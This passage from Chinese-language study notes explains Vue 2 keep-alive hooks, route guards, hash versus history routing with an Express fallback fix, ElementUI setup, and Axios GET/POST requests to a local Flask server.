<router-view></router-view>
</keep-alive> -->
</div>
```





## 12	两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 解释：当我们使用缓存路由的时候，切换路由是不会触发beforeDestroy，也就是组件不会被销毁，如果我们在这里有设置定时器的话它就会一直执行，因为我们在切换路由之前没有停止它，这个时候就需要我们的两个钩子了
3. 具体名字：
    1. ```activated```路由组件被激活时触发。
    2. ```deactivated```路由组件失活时触发。

<span style="color:red">注意：一定是使用了缓存路由才能使用这两个钩子，不然是没有效果</span>

```vue
<script>
	export default {
		name:'News',
		data() {
			return {
				opacity:1
			}
		},
		// 不会执行下面的代码，因为组件不会被销毁(路由缓存)
		// beforeDestroy() {
		// 	console.log('News组件即将被销毁了')
		// 	clearInterval(this.timer)
		// },
		// mounted(){
		// 	this.timer = setInterval(() => {
		// 		console.log('@')
		// 		this.opacity -= 0.01
		// 		if(this.opacity <= 0) this.opacity = 1
		// 	},16)
		// },
		activated() {
			console.log('News组件被激活了')
			this.timer = setInterval(() => {
				console.log('@')
				this.opacity -= 0.01
				if(this.opacity <= 0) this.opacity = 1
			},16)
		},
		deactivated() {
			console.log('News组件失活了')
			clearInterval(this.timer)
		},
	}
</script>
```





## 13	路由守卫

1. 作用：对路由进行权限控制
2. 分类：全局守卫、独享守卫、组件内守卫

**说明**：路由守卫其实就是拦截器，拦截到要跳转的路由，然后做一些判断，然后决定是否放行



### ①全局路由守卫

```js
// 全局前置路由守卫 --> 初始化的时候被调用、每次路由切换之前被调用
router.beforeEach((to, from, next) => {
    console.log('前置路由守卫', to, from);
    // 从meta中拿出isAuth来判断是否需要授权
    if (to.meta.isAuth === true) {
        // 这里模拟获取token的来进行验证，在localStorage中设置两个值
        console.log(localStorage.getItem('school'));
        if (localStorage.getItem('school') !== '社会大学') {
            alert("很抱歉，您无权访问")
        } else {
            next()
        }
    } else {
        next()
    }
})

//全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用
router.afterEach((to, from) => {    // 后置路由守卫没有next，因为它不需要
    // 这里就是路由跳转之后要做的事，比如网页的标题 --> 我们可以在meta属性来动态生成标题
    console.log('后置路由守卫', to, from);
    document.title = to.meta.title || '管理系统'
})

export default router
```

![image-20211205221825771](D:\学习笔记\img\20211205221827.png)

**说明**：meta是给程序员用的，用来存储我们需要的数据，我们在设置路由的时候就可以将数据放到meta配置项中

![image-20211205223524053](D:\学习笔记\img\20211205223525.png)



**补充说明**：

-   **问题**：请求`/`的时候会先出现我们的项目名，然后再出现我们设置好的名字

-   **第一种解决方案**：public/index.html文件

    ![image-20211205223738564](D:\学习笔记\img\20211205223944.png)

    这个是从`package-lock.json`文件中的name属性读取的，我们可以通过修改这个来解决这个问题

-   **第二种解决方案**：直接修改title标签体的内容

    ```html
    <title>硅谷系统</title>
    ```

    

### ②独享路由守卫

就是局部的，给单个路由使用的，它的功能还是和全局路由守卫一样，**不同的是它没有后置路由守卫**

```js
			{
                    name: 'xinwen',
                    path: 'news',
                    component: News,
                    meta: { isAuth: true, title: '新闻' },
                    // 独享守卫
                    beforeEnter: (to, from, next) => {
                        console.log('独享前置路由守卫', to, from);
                        // 从meta中拿出isAuth来判断是否需要授权
                        if (to.meta.isAuth === true) {
                            // 这里模拟获取token的来进行验证，在localStorage中设置两个值
                            console.log(localStorage.getItem('school'));
                            if (localStorage.getItem('school') !== '社会大学') {
                                alert("很抱歉，您无权访问")
                            } else {
                                next()
                            }
                        } else {
                            next()
                        }
                    }
                },
```

独享路由守卫和后置全局路由守卫可以配合使用



### ③组件内守卫

必须是通过路由规则进入组件才会调用这两个守卫

```js
//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},
//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```

**说明**：

-   前置路由守卫是在进入组件之前，而组件内的`beforeRouteEnter`是进入组件时，就是说前置路由守卫是在`beforeRouteEnter`之前就调用了
-   后置路由守卫和`beforeRouteLeave`，后置路由守卫是路由跳转后进行调用，而`beforeRouteLeave`是在离开这个组件的时候才会进行调用，两者是不同的

```vue
<template>
	<h2>我是About的内容</h2>
</template>

<script>
export default {
	name: "About",
	beforeRouteEnter(to, from, next) {
		console.log("About--beforeRouteEnter", to, from);
		if (to.meta.isAuth) {
			//判断是否需要鉴权
			if (localStorage.getItem("school") === "社会大学") {
				next();
			} else {
				alert("学校名不对，无权限查看！");
			}
		} else {
			next();
		}
	},
	beforeRouteLeave(to, from, next) {
		console.log("About--beforeRouteLeave", to, from);
		next()
	},
};
</script>
```





## 14	路由工作的两种模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。



### ①hash模式

1. 地址中永远带着#号，不美观 。
2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
3. 兼容性较好。



### ②history模式

1. 地址干净，美观 。
2. 兼容性和hash模式相比略差。
3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题



### ③解决history404问题

**问题**：history模式部署到服务器上会出现问题，通过路由跳转的页面刷新后会出现404的问题

首先我们来手写一个服务器，然后将写好的项目部署上去

1.   创建demo目录，使用`npm init`初始化项目

2.  下载express包，`npm i express`

3.  目录下创建js文件，`server.js`

4.  编写server.js

    ```js
    const express = require('express')
    
    const app = express()
    app.use(express.static(__dirname+'/static'))
    app.get('/person', (req, res) => {
        res.send({
            name: 'tom',
            age: 18,
        })
    })
    
    app.listen(5001, (err) => {
        if (!err) {
            console.log('服务器启动成功了');
        }
    })
    ```

5.  创建static目录用于存放我们编译好的项目文件

6.  然后将我们的项目编译放到服务器上

    -   history模式

        <img src="D:\学习笔记\img\20211206152546.png" alt="image-20211206152545393" style="zoom: 80%;" />

    -   hash模式

        不会出现404的问题，因为hash模式的#是不会发送给服务器端的



**解决**：在后端进行处理，java有对应的类库来解决这个问题，在这里我们使用node.js的`connect-history-api-fallback`类库来解决，npm下有对应的教程

```shell
# 安装
npm install --save connect-history-api-fallback
# 使用
var history = require('connect-history-api-fallback');
```

修改server.js文件

```js
const express = require('express')
// 引入connect-history-api-fallback
var history = require('connect-history-api-fallback');
const app = express()
// 使用history
app.use(history())
app.use(express.static(__dirname+'/static'))

app.get('/person', (req, res) => {
    res.send({
        name: 'tom',
        age: 18,
    })
})

app.listen(5001, (err) => {
    if (!err) {
        console.log('服务器启动成功了');
    }
})
```







# 六、使用ElementUI组件库

## 1	概述

elementUI是由饿了么团队基于vue来开源的一套组件库

vue2版本Element官方文档：https://element.eleme.io/#/zh-CN

vue3版本Element官方文档：https://doc-archive.element-plus.org/#/zh-CN





## 2	使用

查看官方文档使用

注意：`babel.config.js`和官方文档的会有一点不同

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    // "presets": [["es2015", { "modules": false }]],   // 官方文档的
    ["@babel/preset-env", { "modules": false }],
  ],
  plugins: [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```













































































# Axios学习

## 1	什么是 axios？

Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。

**安装**

使用npm安装

```shell
$ npm install axios
```

使用 cdn:

```html
<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
```



## 2	get请求

接口是使用python的flask来写的

```python
from flask import Flask
from flask import jsonify
from flask_cors import cross_origin
app = Flask(__name__)

@app.route('/json', methods=['GET','POST'])
# 允许跨域
@cross_origin()
def demo2():
    json_dict = {
        'name': 'xiaozhi',
        'age': 20,
        'sex': "boy",
        'address': 'guangdong',
    }
    return jsonify(json_dict)

if __name__ == '__main__':
    app.run()
```

发送get请求获取到数据

```html
<body>
    <div id="root">
        <div>{{msg}}</div>
        <div>{{msg2}}</div>
    </div>
</body>
<script>
    new Vue({
        el: '#root',
        data: {
            // 创建一个对象用于接收数据
            info: {},
            info2: {},
        },
        computed: {
            msg() {
                return JSON.stringify(this.info)
            },
            msg2() {
                return JSON.stringify(this.info2)
            },
        },
        mounted() {
            // 第一种方式
            axios.get('http://127.0.0.1:5000/json').then(resp => {
                this.info = resp.data
            }).catch(error => {     // catch：请求失败就会调用这个函数
                console.log('您的请求出现了异常 --> ', error);
            })
            
            // 第二种方式 --> params配置项
            axios.get("http://127.0.0.1:5000/json", {
                params: {
                    id: "001"
                }
            }).then(resp => {
                this.info2 = resp.data
            })
        },
    })
</script>
```



## 3	post请求

post接口编写

```python
from flask import Flask, request
from flask import jsonify
from flask_cors import cross_origin
app = Flask(__name__)

@app.route('/json', methods=['GET','POST'])
# 允许跨域
@cross_origin()
def demo2():
    json_dict = {
        'name': 'xiaozhi',
        'age': 20,
        'sex': "boy",
        'address': 'guangdong',
    }
    # 获取请求体中的内容
    data = request.data
    print(data.decode('utf-8'))
    return jsonify(json_dict)

if __name__ == '__main__':
    app.run()
```

和get请求类似

```html
<body>
    <div id="root">
        <div>{{msg}}</div>
    </div>
</body>
<script>
    new Vue({
        el: '#root',
        data: {
            // 创建一个对象用于接收数据
            info: {},
        },
        computed: {
            msg() {
                return JSON.stringify(this.info)
            },
        },
        mounted() {
            axios.post('http://127.0.0.1:5000/json', {
                // 第二个参数是请求体的内容
                firstName: '法外狂徒',
                lastName: '张三',
            }).then((resp) => {
                this.info = resp.data
            }).catch((error) => {
                console.log("请求失败 --> ", error);
            });
        },
    })
</script>
```

![image-20211201114631932](D:\学习笔记\img\20211201114633.png)

是可以接收到的！！！



​	







